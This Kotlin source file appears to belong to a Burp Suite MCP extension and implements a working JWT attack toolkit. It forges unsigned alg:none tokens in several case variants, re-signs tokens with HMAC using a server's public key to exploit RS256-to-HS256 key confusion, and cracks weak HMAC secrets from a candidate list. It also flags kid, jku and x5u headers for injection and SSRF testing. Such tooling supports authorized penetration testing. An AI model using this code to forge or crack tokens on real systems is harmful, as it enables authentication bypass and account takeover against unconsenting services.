package com.burpmcp.ultra.jwt

import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.longOrNull
import java.time.Instant
import java.util.Base64
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

/**
 * Pure JWT attack toolkit — decode, forge, crack, and analyze. No Montoya
 * dependency, so it is fully unit-testable. Backs the `jwt_attack` MCP tool.
 *
 * Covers the high-value JWT bug classes the old decode-only tool missed:
 * `alg:none` forgery, RS256->HS256 key confusion (sign with the public key as
 * the HMAC secret), weak-secret cracking, and `kid`/`jku`/`x5u` injection
 * surfacing.
 */
object Jwt {
    private val urlEnc = Base64.getUrlEncoder().withoutPadding()
    private val urlDec = Base64.getUrlDecoder()

    fun b64UrlEncode(bytes: ByteArray): String = urlEnc.encodeToString(bytes)
    fun b64UrlEncode(s: String): String = b64UrlEncode(s.toByteArray(Charsets.UTF_8))
    fun b64UrlDecode(s: String): ByteArray = urlDec.decode(s)

    data class Parts(
        val header: JsonObject,
        val payload: JsonObject,
        val signature: String,
        val headerB64: String,
        val payloadB64: String
    ) {
        val alg: String? get() = header["alg"]?.jsonPrimitive?.contentOrNull
        val signingInput: String get() = "$headerB64.$payloadB64"
    }

    /** Decodes a token into its header/payload objects + raw parts, or null if not a JWT. */
    fun decode(token: String): Parts? {
        val parts = token.split(".")
        if (parts.size < 2) return null
        return try {
            val header = Json.parseToJsonElement(String(b64UrlDecode(parts[0]), Charsets.UTF_8)).jsonObject
            val payload = Json.parseToJsonElement(String(b64UrlDecode(parts[1]), Charsets.UTF_8)).jsonObject
            Parts(header, payload, parts.getOrElse(2) { "" }, parts[0], parts[1])
        } catch (e: Exception) {
            null
        }
    }

    private fun jcaAlg(alg: String): String? = when (alg.uppercase()) {
        "HS256" -> "HmacSHA256"
        "HS384" -> "HmacSHA384"
        "HS512" -> "HmacSHA512"
        else -> null
    }

    /** Computes the base64url HMAC signature over [signingInput], or null for a non-HMAC alg. */
    fun hmac(signingInput: String, key: ByteArray, alg: String): String? {
        val jca = jcaAlg(alg) ?: return null
        val mac = Mac.getInstance(jca)
        mac.init(SecretKeySpec(key, jca))
        return b64UrlEncode(mac.doFinal(signingInput.toByteArray(Charsets.UTF_8)))
    }

    /** Returns the first candidate secret that reproduces an HS* token's signature, or null. */
    fun crack(token: String, candidates: List<String>): String? {
        val p = decode(token) ?: return null
        val alg = p.alg ?: return null
        if (jcaAlg(alg) == null) return null
        for (c in candidates) {
            if (c.isEmpty()) continue // JCA rejects a zero-length HMAC key ("Empty key"); skip, don't abort the run
            val sig = try { hmac(p.signingInput, c.toByteArray(Charsets.UTF_8), alg) } catch (_: Exception) { null }
            if (sig != null && sig == p.signature) return c
        }
        return null
    }

    /** Forges `alg:none` variants (case permutations) with an empty signature, applying optional payload [overrides]. */
    fun forgeNone(token: String, overrides: JsonObject? = null): List<String> {
        val p = decode(token) ?: return emptyList()
        val payload = if (overrides != null) JsonObject(p.payload + overrides) else p.payload
        val payloadB64 = b64UrlEncode(payload.toString())
        return listOf("none", "None", "NONE", "nOnE").map { alg ->
            val header = JsonObject(p.header + mapOf("alg" to JsonPrimitive(alg)))
            "${b64UrlEncode(header.toString())}.$payloadB64."
        }
    }

    /**
     * Re-signs the token with HMAC using [secret] under [alg], applying optional
     * payload [overrides]. Doubles as the RS->HS confusion primitive: pass the
     * server's public key text as [secret].
     */
    fun resign(token: String, secret: String, alg: String, overrides: JsonObject? = null): String? {
        val p = decode(token) ?: return null
        val header = JsonObject(p.header + mapOf("alg" to JsonPrimitive(alg)))
        val payload = if (overrides != null) JsonObject(p.payload + overrides) else p.payload
        val signingInput = "${b64UrlEncode(header.toString())}.${b64UrlEncode(payload.toString())}"
        val sig = hmac(signingInput, secret.toByteArray(Charsets.UTF_8), alg) ?: return null
        return "$signingInput.$sig"
    }

    data class JwtIssue(val id: String, val severity: String, val detail: String)

    /** Flags offensive properties of a token (alg family, kid/jku, exp). */
    fun analyze(token: String): List<JwtIssue> {
        val p = decode(token) ?: return listOf(JwtIssue("parse_error", "info", "Not a decodable JWT."))
        val issues = mutableListOf<JwtIssue>()
        val alg = (p.alg ?: "").uppercase()
        when {
            alg == "NONE" -> issues.add(JwtIssue("alg_none", "critical", "alg=none — if accepted, tokens can be forged unsigned (mode=forge_none)."))
            alg.startsWith("HS") -> issues.add(JwtIssue("alg_hmac", "info", "HMAC alg (${p.alg}) — test weak-secret cracking (mode=crack)."))
            alg.startsWith("RS") || alg.startsWith("ES") || alg.startsWith("PS") ->
                issues.add(JwtIssue("alg_asymmetric", "medium", "Asymmetric alg (${p.alg}) — test RS->HS confusion with the server's public key (mode=alg_confusion)."))
        }
        if (p.header.containsKey("kid"))
            issues.add(JwtIssue("kid_present", "medium", "kid header present — test path-traversal / SQLi injection in the kid value."))
        if (p.header.containsKey("jku") || p.header.containsKey("x5u"))
            issues.add(JwtIssue("jku_x5u_present", "high", "jku/x5u header present — test SSRF and attacker-hosted key substitution."))
        val exp = p.payload["exp"]?.jsonPrimitive?.longOrNull
        when {
            exp == null -> issues.add(JwtIssue("no_exp", "low", "No exp claim — token may not expire."))
            exp < Instant.now().epochSecond -> issues.add(JwtIssue("expired", "info", "Token is expired (exp is in the past)."))
        }
        return issues
    }
}
